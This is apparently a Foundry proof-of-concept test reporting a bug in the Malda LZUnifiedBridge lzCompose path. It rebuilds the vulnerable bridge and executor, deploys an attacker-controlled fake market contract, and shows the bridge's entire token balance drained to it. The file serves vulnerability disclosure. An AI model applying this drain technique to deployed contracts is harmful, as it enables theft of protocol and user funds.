// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import "forge-std/Test.sol";

/*
  PoC: Malda LZUnifiedBridge.lzCompose drains the bridge to an attacker-chosen `market`.

  Faithful minimal reproduction of the POST-AUDIT code (commit #149, not in the Sherlock
  audit base c60d6c3):
    - src/rebalancer/bridges/LZUnifiedBridge.sol::lzCompose            (L154-193)
    - src/rebalancer/bridges/helpers/BaseOftMessageExecutor.sol::_fallbackToUnderlying (L116-131)

  Bug: `market` is decoded from the attacker-controlled compose message; only endpoint+from are
  checked (which constrain the OFT/underlying, NOT the market); the delegatecalled executor then
  transfers the bridge's ENTIRE underlying balance to that market with no isMarket validation.
*/

// minimal ERC20 (the underlying; native-OFT in the simple branch)
contract MockToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }
}

interface IMarketUnderlying { function underlying() external view returns (address); }

// == reproduces BaseOftMessageExecutor (delegatecalled -> address(this) == the bridge) ==
contract OftExecutor {
    function executeCompose(address market, address underlying, address bridgeContract) external payable {
        _fallbackToUnderlying(market, underlying, bridgeContract);
    }
    function _fallbackToUnderlying(address market, address underlying, address bridgeContract) internal {
        if (bridgeContract == underlying) {
            uint256 bal = MockToken(underlying).balanceOf(address(this)); // address(this) == bridge (delegatecall)
            MockToken(underlying).transfer(market, bal);                  // <-- WHOLE balance -> attacker market
        }
        // else branch (wrap OFT -> underlying -> transfer to market) is the same drain
    }
}

// == reproduces LZUnifiedBridge.lzCompose ==
contract VulnBridge {
    address public immutable ENDPOINT;
    address public oftExecutor;
    mapping(address => address) public bridgeContracts; // underlying -> bridgeContract (0 => underlying)

    constructor(address endpoint, address executor) {
        ENDPOINT = endpoint;
        oftExecutor = executor;
    }

    function lzCompose(address from, bytes32, bytes calldata message, address, bytes calldata) external payable {
        require(msg.sender == ENDPOINT, "OnlyEndpoint");               // L165
        address market = abi.decode(message, (address));              // L167  <-- ATTACKER-CONTROLLED
        address underlying = IMarketUnderlying(market).underlying();  // L168  <-- via attacker's fake market
        address bridgeContract = bridgeContracts[underlying];
        if (bridgeContract == address(0)) bridgeContract = underlying; // L171-173
        require(from == bridgeContract, "BadFrom");                    // L176  (constrains OFT, NOT market)
        (bool ok, bytes memory ret) = oftExecutor.delegatecall(        // L187
            abi.encodeWithSelector(OftExecutor.executeCompose.selector, market, underlying, bridgeContract)
        );
        require(ok, string(ret));
    }
}

// attacker's fake "market": .underlying() returns the REAL underlying U; receives the loot
contract FakeMarket is IMarketUnderlying {
    address public u;
    constructor(address _u) { u = _u; }
    function underlying() external view returns (address) { return u; }
}

contract LzComposeDrainTest is Test {
    MockToken U;
    OftExecutor executor;
    VulnBridge bridge;
    address ENDPOINT = address(0xE2D);
    address attacker = address(0xA11CE);

    function setUp() public {
        U = new MockToken();
        executor = new OftExecutor();
        bridge = new VulnBridge(ENDPOINT, address(executor));
        // protocol funds sitting in the bridge (rebalance in-transit / uncomposed):
        U.mint(address(bridge), 1000 ether);
    }

    function test_attacker_drains_bridge_via_fake_market() public {
        vm.prank(attacker);
        FakeMarket fake = new FakeMarket(address(U)); // .underlying() -> real U (so from==U passes)

        assertEq(U.balanceOf(address(bridge)), 1000 ether, "bridge funded");
        assertEq(U.balanceOf(address(fake)), 0);

        // LZ endpoint delivers the attacker's compose: from = U's OFT (=U here), message = fake market
        bytes memory message = abi.encode(address(fake));
        vm.prank(ENDPOINT);
        bridge.lzCompose(address(U), bytes32(0), message, address(0), "");

        // DRAIN confirmed: the bridge's entire balance is now at the attacker's fake market
        assertEq(U.balanceOf(address(bridge)), 0, "BUG: bridge fully drained");
        assertEq(U.balanceOf(address(fake)), 1000 ether, "BUG: attacker received the funds");
        emit log_string("CONFIRMED: lzCompose drained the bridge to an attacker-chosen market");
    }
}
